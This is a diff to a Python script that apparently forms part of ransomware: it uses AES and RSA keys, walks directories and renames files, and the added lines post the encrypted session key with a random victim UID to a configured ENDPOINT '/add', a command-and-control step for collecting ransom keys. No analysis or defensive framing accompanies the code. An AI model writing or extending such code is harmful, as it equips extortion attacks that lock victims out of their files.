@@ -6,6 +6,8 @@ import json
 import os
 import base64
 import pickle
+import uuid
+from urllib.request import urlopen
 
 import Crypto.Random
 from Crypto.Cipher import AES, PKCS1_OAEP
@@ -13,6 +15,8 @@ from os import walk, rename
 from os.path import isdir, isfile, join, splitext
 
 from Crypto.PublicKey import RSA
+from urllib import request
+from config import ENDPOINT
 
 key = Crypto.Random.get_random_bytes(32)
 
@@ -59,6 +63,15 @@ def send():
     ciphertext, tag = cipher_aes.encrypt_and_digest(key)
 
     f.write(codecs.encode(pickle.dumps([x for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]), "base64").decode())
+
+    req = request.Request(ENDPOINT+'/add', headers={
+        'Content-Type': 'application/json'
+    }, data=bytes(json.dumps({
+        'uid': str(uuid.uuid4()),
+        'key': codecs.encode(pickle.dumps([x for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]), "base64").decode()
+    }), 'utf-8'))
+    urlopen(req)
+
     del key
     gc.collect()
 
